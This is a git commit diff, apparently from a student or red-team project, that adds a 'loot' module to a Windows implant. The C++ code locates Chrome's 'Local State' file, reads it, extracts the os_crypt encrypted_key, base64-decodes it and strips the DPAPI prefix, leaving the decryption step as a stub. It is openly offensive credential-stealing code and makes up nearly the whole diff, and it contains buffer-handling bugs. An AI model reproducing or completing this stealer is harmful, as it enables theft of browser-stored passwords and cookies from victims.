2e0bf98d3feaf4200ac881ecab7bc60991dea325
ljstaib <ljstaib@bu.edu>
2022-04-28 23:08:07 -0400

    Working on loot

--- implant_loot/loot.cpp
+++ implant_loot/loot.cpp
@@ -2,8 +2,10 @@
 #include <iostream>
 #include <stdio.h>
 #include <string.h>
+#include <vector>
+#include "json.hpp" //Source: https://github.com/nlohmann/json
 
-std::string getChromeContents() {
+std::string getChromePath() {
 	// Get current user (for the filepath)
 	// 256 is max username length (see lmcons.h)
 	DWORD bufSize = 256 + 1;
@@ -26,14 +28,18 @@ std::string getChromeContents() {
 
 	// printf("%s\n", filePath.c_str());
 
+	return filePath;
+}
+
+std::string loadLocalState(std::string chromePath) {
 	// Get file handle with CreateFile (doesn't actually create a file, it just opens one)
 	HANDLE fileHandle = CreateFileA(
-		(LPCSTR) filePath.c_str(),
+		(LPCSTR) chromePath.c_str(),
 		GENERIC_READ,
 		FILE_SHARE_READ,
 		NULL,
 		OPEN_EXISTING, //Only open if file exists, end process if file does not exist
-		FILE_ATTRIBUTE_NORMAL,
+		FILE_ATTRIBUTE_READONLY,
 		NULL);
 
 	if (fileHandle == INVALID_HANDLE_VALUE) {
@@ -41,21 +47,113 @@ std::string getChromeContents() {
 		return "";
 	}
 
-	printf("TODO\n");
+	DWORD chromeBufSize = 8192 + 1; // Arbitrary sized buffer, can adjust
+	DWORD bytesRead;
+	char* chromeContentsBuf = (char*) malloc(chromeBufSize);
 
-	//Cleanup
+	if (!ReadFile(
+			fileHandle,
+			chromeContentsBuf,
+			chromeBufSize,
+			&bytesRead,
+			NULL)) {
+		printf("[ERROR] File could not be read.\n");
+		// return "";
+	}
+
+	chromeContentsBuf[chromeBufSize] = '\0';
+
+	// Close file handle
 	CloseHandle(fileHandle);
 
-	return "";
+	return chromeContentsBuf;
+}
+
+std::vector<BYTE> b64Decode(std::string strInput){
+    // as before you should make two calls to ::CryptStringToBinaryA 
+    std::vector<BYTE> output;
+
+    DWORD confirmSize;
+
+    BOOL bufsizeCheck = CryptStringToBinaryA(
+    	strInput.c_str(),
+    	strInput.length(),
+    	CRYPT_STRING_BASE64,
+    	NULL,
+    	&confirmSize,
+    	NULL,
+    	NULL);
+
+    if (bufsizeCheck == 0) {
+    	std::cout << "[ERROR] Decrypt: Obtaining the correct size for the buffer failed." << std::endl;
+    	return output; //Return empty output
+    }
+
+    BYTE* buf = (BYTE*) malloc(confirmSize);
+
+    BOOL bufCheck = CryptStringToBinaryA(
+    	strInput.c_str(),
+    	strInput.length(),
+    	CRYPT_STRING_BASE64,
+    	buf,
+    	&confirmSize,
+    	NULL,
+    	NULL);
+
+    if (bufCheck == 0) {
+    	std::cout << "[ERROR] Decrypt: Could not copy data." << std::endl;
+    	return output; //Return empty output
+    }
+
+    // printf("buf:\n");
+    // printf("%s\n", buf);
+
+    //Fill output using buf
+    std::vector<BYTE> out(buf, buf + confirmSize);
+    output = out;
+
+    return output;
+}
+
+void decryptDPAPI(std::string decodedKey) {
+	//TODO
+}
+
+void getAESKEy(std::string chromePath) {
+
+	// Get file "Local State" contents
+	std::string localStateContents = loadLocalState(chromePath);
+	printf("localStateContents: %s\n", localStateContents.c_str());
+
+	// Parse as JSON
+	auto localStateJSON = nlohmann::json::parse(localStateContents.c_str());
+
+	// Get base64 encrypted key
+	std::string b64Key = localStateJSON["os_crypt"]["encrypted_key"];
+
+	// Decode using base64
+	std::vector<BYTE> decodedKey = b64Decode(b64Key);
+
+	printf("Decoded key: %s\n", decodedKey);
+
+	// Ignore magic bytes and return
+	std::string keyOut(decodedKey.begin() + 5, decodedKey.end());
+
+	return decryptDPAPI(keyOut);
 }
 
 int main(int argc, char* argv[]) {
 	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
 	// "Local State" is the file
 
-	// getChromeContents(): get contents of JSON file "Local State"
+	// Get filepath
+	std::string chromePath = getChromePath();
+	printf("chromePath: %s\n", chromePath.c_str());
 
-	std::string chromeContents = getChromeContents();
+	// Get AES key
+	getAESKEy(chromePath);
+
+	// getChromeContents(): get contents of JSON file "Local State"
 
 	// JSON file with secret key, encrypted with data protection api (DPAPI)
 	// To decrypt:
